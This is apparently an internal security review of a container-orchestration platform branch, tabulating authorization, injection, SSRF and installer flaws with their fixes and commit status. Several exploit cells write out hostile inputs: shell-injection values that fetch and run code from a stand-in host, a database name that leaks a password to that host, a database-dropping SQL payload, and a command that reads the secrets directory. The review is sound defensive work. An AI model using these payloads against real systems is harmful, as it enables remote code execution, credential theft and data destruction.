# Security review — 2026-09 (branch `claude/swarmy-platform-roadmap-4f6qfm`)

Scope: the ~110 commits since `origin/main`: auth, ABAC, secret variables,
the registry, agent commands, git apps, DNS-01, ingest endpoints and the installer.
Every finding was verified by reading the working tree. **Status** gives the fix
commit, or explains why the finding is still open.

## Critical

| # | Finding | Where | Exploit | Fix | Status |
|---|---|---|---|---|---|
| C1 | Host-path binds through backup volume fields | `protocol/{backup,appDb,dbBackup}.ts` (bare `z.string()`); `apps/agent/src/handlers/{backup,appdb}.ts` Binds; `routers/backups.ts:49`, `dbBackup.ts:42` (orgProcedure) | A member calls `backups.backupVolume({volume:'/'})`, and restic archives the host root (swarm raft/CA keys, `/etc/shadow`). A restore with `targetVolume:'/'` mounts host `/` read-write, which is root on the node. | A `DockerVolumeName` regex in the protocol, an agent-side bind guard, and ABAC on the routers | agent/protocol: `c11117b`; routers: `fa9521c` |
| C2 | Shell injection in the Postgres restore sidecars | `handlers/backup.ts` (`-d "${targetDb}"`, `"${targetTime}"`, `${snapshotId}` inside `sh -c`) | `targetTime: '"; wget evil\|sh; "'` runs code in a sidecar that has PGDATA read-write | Pass the values as env, reference them as `"$VAR"`, and validate them in the schema | `c11117b` |
| C3 | A member can unmark production | `routers/guardrails.ts:40` `setStackEnv` (orgProcedure) | Removing `swarmy.env` turns off every production-scoped default, so members can then deploy, configure and read data on prod | `adminProcedure` | `da513b9` |
| C4 | Scheduled jobs and workflows exec into production | `routers/jobs.ts:54/59/74`, `workflows.ts:66-101` | A `service-exec` job running `cat /run/secrets/*` on a prod service gets around `terminal.open` and `secrets.read` | `authorize('terminal.open')` on the target service at create/update/run; image jobs need `service.deploy`; approve/reject are admin-only | `c5e43c8` |
| C5 | A member can steal AI provider keys | `routers/ai.ts:65` `setProvider` (orgProcedure) → `ai.service.ts:192` | Swap `baseUrl` to an attacker host and keep the stored key. The gateway then sends the org's key there on every call. | `adminProcedure` for provider/settings/outlet, and `service.configure` for attach/grant | `8aaff87`: admin-only; the stored key is dropped when the base URL's origin changes |
| C6 | Shell injection through the installer version | `apps/api/src/index.ts:157,171` → `install/loader.ts`, `installer.ts` | The real controller serves `loader.sh?version=x%0Acurl evil\|sh` to `curl \| sh` as root, before any checksum check | Only a plain version token renders | `c5479ec` |

## High

| # | Finding | Where | Exploit | Fix | Status |
|---|---|---|---|---|---|
| H1 | The registry cache :5001 (no login) and registry :5000 are reachable on every node's public IP | `system-images.service.ts:73`, `registry-auth.ts:96`: `mode: 'ingress'`, and swarm can't bind a published port to loopback | Anyone can use the cache as an open Docker Hub proxy (fills the disk, uses the node's Hub rate limit and bandwidth), and the registry's htpasswd prompt faces the internet | The agent keeps a `SWARMY-REGISTRY` chain, jumped from `DOCKER-USER`, that drops forwarded connections to the published :5000/:5001 (local bridges and `SWARMY_REGISTRY_FIREWALL_ALLOW` are exempt). It is re-asserted every 5 minutes so it survives reboots. The container backend applies it through a host-network NET_ADMIN sidecar of its own image. Loopback pulls and the mirror are unaffected. | `c20e0e0` |
| H2 | Org admins write the instance-wide sign-in config | `routers/authConfig.ts:41` → `authConfig.service.ts:109`; `provisioning.ts:173` joins the oldest org | With open signup, anyone can create an org, then set `allowedDomains=attacker.com` or change the GitLab issuer. That gives them sign-up into org A. | `instanceOwnerProcedure` | `c3a1abd` |
| H3 | Account takeover across orgs through a rogue org-SSO IdP | `server.ts` (default implicit linking), `sso.ts:20` | The IdP asserts `email=owner@A, email_verified=true`, and gets linked to A's owner, who is exempt from MFA | `accountLinking` with no trusted providers, plus an `account.create.before` membership check. Provider ids `google`/`credential` are reserved. | `3059560` |
| H4 | App-DB dump/restore scripts trust database names | `protocol/appDbScripts.ts` (~411, 622, 643, 659) | A database named `postgresql://evil/x` makes pg_dump send the superuser password to evil. `x';DROP DATABASE prod;--` is SQL injection at restore. `--host=evil` is treated as a mysqldump option. | Filter names, use `PGDATABASE=`, use psql `-v` quoting, use `--` | `fe79d59` |
| H5 | Studio read-only classifier bypass | `core/src/studio/classify.ts:222` only matches `word` tokens | With only `data.read`: `SELECT "pg_read_file"(...)` reads server files, `"dblink_exec"` writes, and `query_to_xml('…')` hides calls inside a string | Match `ident` tokens too and extend the list of dangerous functions | `fcb6bbe` |
| H6 | Production deploys that skip `stack.deploy` | `routers/releases.ts:45/67/72` | A member rolls back, canaries or promotes a production stack | `abacProcedure('stack.deploy')` | `da513b9` |
| H7 | Members turn off guardrails and exposure rules | `guardrails.ts:29/34`, `exposure.ts:33/38`, `releases.ts:55` | A member switches off blocking, then deploys | `adminProcedure` | `da513b9` |
| H8 | `ingress.write` without a resolver acts on production domains | `routers/ingress.ts:109-194` + REST `routes/ingress.ts` | With a null resource, `NON_PRODUCTION` holds, so members can re-point or delete production domains | Resolve the target service's live labels | `d774f83` |
| H9 | The managed data plane has no gate | `manageddb.ts`, cache/search/vector, `dbBackup.ts`, `backups.ts` | A member injects production DB credentials into a service they choose, or runs `migrateStorage` with `skipBackup` | `stack.deploy` / `service.configure` / admin | `fa9521c` |
| H10 | Node labels and uncordon have no gate (tRPC and REST) | `nodes.ts:46/112`, REST `node-actions.ts:61,78` | A member steers production placement or un-drains a node | `node.setLabels` / `node.drain` | `875e2e4` |
| H11 | zstd decompression bomb on unauthenticated error ingest | `trpc/services/errors/envelope.ts:136` (no output cap; decode runs before auth) | A ~20 MB frame expands to many GB and exhausts the controller's memory | Streaming zstd with a byte cap, or refuse zstd, and check the key before decoding | `8a69488`: key checked before decoding; every codec bounded (≤20 MiB, ≤100× input) |
| H12 | Unauthenticated `/_wake/:service` scales any service in any org and redirects anywhere | `apps/api/src/activator.ts` | It starts services deliberately stopped at 0 and works as an open 307 redirect | Only services opted into scale-to-zero; `return` must be on the same host | `502e7e1` (org-signed wake tokens are still a follow-up) |
| H13 | No request body limits | `apps/api/src/index.ts:395` (Bun's 128 MB default); `webhooks.ts` reads the whole body before the HMAC check | Parallel 128 MB POSTs exhaust the controller's memory | `bodyLimit` of 10 MB on webhooks; a global `maxRequestBodySize` and per-mount limits | webhooks `145cce9`, ingest/RUM `1a8e6b3`, AI `6c5a76c`; global `maxRequestBodySize` is a patch for `index.ts` (below) |
| H14 | AI gateway SSRF that reflects the response | `ai-gateway.ts:496-517`; `baseUrl` is not validated (`ai.service.ts:199`) | An admin points `baseUrl` at `http://127.0.0.1:<port>/x?`, and the 2xx body is returned verbatim | Reject loopback, link-local and RFC1918 addresses unless the host is in the inventory; refuse `?` and `#` | `891c9d6` guard, `8aaff87` at save, `6c5a76c` at request time (no redirects, no reflected error bodies). Residual: DNS-rebinding race; no operator opt-out for LAN endpoints |
| H15 | `state.env` is briefly world-readable | `scripts/install-swarmy.sh:135-138` (no umask) | A local user reads the `.tmp` file and gets the swarm manager token | `umask 077`, `mktemp` in the state directory | `22542fe` (the commit also swept in unfinished `--mesh swarmy` work; the mesh agent is completing it) |
| H16 | Join token and mesh key kept in `docker inspect` | `install/installer.ts` container backend (`-e`) | Anything with access to the socket reads a reusable join key | A 0600 env file mounted read-only | `c5479ec` join script, `22542fe` install-swarmy.sh. Residual: `apps/agent/src/handlers/mesh.ts:113` still uses `-e NB_SETUP_KEY` |
| H17 | The pinned installer is not protected over plain HTTP | `loader.ts`, `installer.ts` on `http://ip:3021` installs | An attacker on the network path rewrites the loader and gets root on every node that joins | Refuse non-LAN `http://` unless `SWARMY_ALLOW_INSECURE=1`; print the loader sha for out-of-band checking | Fixed (owner decision: HTTPS only). Install routes redirect HTTP to HTTPS or refuse, except loopback (node-local bootstrap) and the explicit `--allow-insecure-install`; loader + installer refuse `http://` and pin curl to `--proto =https`; downloads are checked against the signed release manifest (`agentBinaries`, agent image digest) verified on the node with the release key, falling back to the controller's checksum with a warning when no key is configured. `apps/api/src/install/{transport,release,release-verify-sh}.ts` |

## Medium

| # | Finding | Where | Status |
|---|---|---|---|
| M1 | A session with MFA pending can get OAuth tokens and disable 2FA | `oidc-provider.ts:180`, `two-factor.ts:67` | `60cd341` |
| M2 | Linking any social account satisfies an email-named invite | `provisioning.ts:126`, `server.ts:211` | `3059560` |
| M3 | Plain env values returned unredacted to members (`services.get`, `inventory.get`, REST DTOs); the redaction heuristic misses `*_PASS` and `PASSPHRASE`; Args like `--requirepass` are not masked | `service.service.ts:140`, `dotenv.ts:136` | `6332eec`: heuristic, plus `services.get` masked without `secrets.read`. `inventory.get` and Args masking are **OPEN** |
| M4 | Resolvers return null for an unknown id, which then authorizes against the org (fail-open by design); an offline node looks non-production | `abac.ts:403,418,503` | patch below (the `destructive-gates.test.ts` fixture must use real ids first) |
| M5 | An admin can lock owners out (forbid on owner / disable "Owners can do anything") | `policies.service.ts:76` | **OPEN** |
| M6 | Git OAuth/App `state` is not tied to the browser (installation hijack) | `git-providers/state.ts:26-65` | **OPEN** |
| M7 | Installation tokens not narrowed per repo; clone URL not bound to the connection host | `git-credentials.ts:76`, `git-connections.service.ts:605,710` | **OPEN** |
| M8 | Webhook replay dedup is in memory only (a signed old push replays as a rollback) | `webhook-verify.ts:118` | **OPEN** |
| M9 | `purgeAppData` never checks that the resource is in `led.kept` | `apps.service.ts:1710` | patch below |
| M10 | Members read DLQ payloads and requeue jobs | `routers/queues.ts:77-88` | patch below |
| M11 | The exec veto only applies to `execCommand`; `dbQuery`, `appDb*`, `queueOp` and `runOnce` (any binds) skip it | `apps/agent/src/executor.ts` | local veto: patch below; `runOnce` bind allowlist **OPEN** |
| M12 | MySQL `SET PASSWORD`/`SET ROLE` classified as read; studio lexer drifts on non-default string modes | `studio/classify.ts:39` | SET: `fcb6bbe`; string-mode **OPEN** |
| M13 | `terminal.open` gets past `secrets.read` for services that mount secrets; recordings capture the values | shim + `terminal.ts` | **OPEN** (product decision) |
| M14 | NetBird PAT on curl argv; `--admin-password` flag; `:latest` agent image and `main` stack file are not pinned | `install-swarmy.sh:114,557,664`, `agent env.ts:21` | PAT on curl argv: `22542fe`; the rest **OPEN** |
| M15 | Uninstall leaves `agent.json`, the mesh sidecar and `state.env`, and doesn't rotate join tokens | `installer.ts:152`, `install-swarmy.sh:916` | **OPEN** |
| M16 | Basic-auth registry creds cross the unencrypted `ingress` overlay between nodes | routing mesh | **OPEN**: move the registry off the routing mesh onto a loopback forwarder on the encrypted `swarmy` overlay |

## Low

- JWT access tokens outlive sign-out and session revocation (`api-tokens.ts:58`). Use a shorter TTL or a `tokensRevokedAt` check.
- Placeholder SSO emails collide (`identity.ts:28`): `acme.corp` and `acme_corp` map to the same address. Hash `providerId+sub` instead.
- A deleted SSO provider's `account` rows survive, so a re-created provider id in another org can reclaim those identities.
- Any org admin can register the controller-wide GitHub App (first one wins).
- Forward-auth accepts broad wildcards like `*.com` as the code redirect host. The decision cache ignores session revocation for `DECISION_CACHE_MS`.
- The AI keys have no default RPM limit, and there is no per-IP 401 limit.
- Renaming a default policy re-enables it through `ensureDefaults`. `whoCan` ignores ReBAC grants for hypothetical resources.
- A redis argv starting with `-` becomes a CLI flag; Mongo passes `--password=` on argv; the studio audit stores statement text.
- `daemon.json.swarmy-bak` is overwritten by the second merge step, so the operator's original is lost.
- Secrets are echoed at the end of the install.

## Verified sound

- Invites: 7 days, single-use (a conditional claim).
- `allowedDomains`: exact match, case-insensitive, and the email must be verified.
- OIDC provider:
  - redirect URIs match exactly (only loopback may vary the port);
  - PKCE is S256;
  - client secrets are stored as sha256 and compared in constant time;
  - dynamic client registration is off;
  - claims come from the user's real membership.
- Terminal step-up.
- Webhooks: HMAC over the raw body, constant-time, checked before any work. Fork PRs are refused and fail closed.
- DNS-01: a per-org HMAC bearer compared in constant time, and the name must be both routed by the org and inside the org's own zone.
- Error-ingest DSN keys are hashed.
- Forward-auth: the JWT audience is the host, the cookie is host-only with the `__Host-` prefix, and the code is single-use.
- The secret-env shim is injection-free. Reveal is non-streaming, gated on `secrets.read` and audited. The secret GC waits out a grace window and Docker refuses to remove in-use secrets.
- Studio routes are gated `data.read`/`write`/`destroy`, and reads run inside read-only transactions.

## Patches for files that were dirty at review time

`apps/api/src/index.ts` (global `maxRequestBodySize` 32 MB), `apps/agent/src/executor.ts`
(the `SWARMY_ALLOW_EXEC=false` veto also covers dbQuery/queueOp/appDb*),
`packages/trpc/src/abac.ts` (resolvers throw NOT_FOUND for a supplied id that doesn't resolve),
`routers/queues.ts` (DLQ list = `data.read`, retry/requeue = `data.write`) and
`services/apps.service.ts` (`purgeAppData`: evaluate the policy first, then require `led.kept`)
are delivered to the integrator as one unified diff.
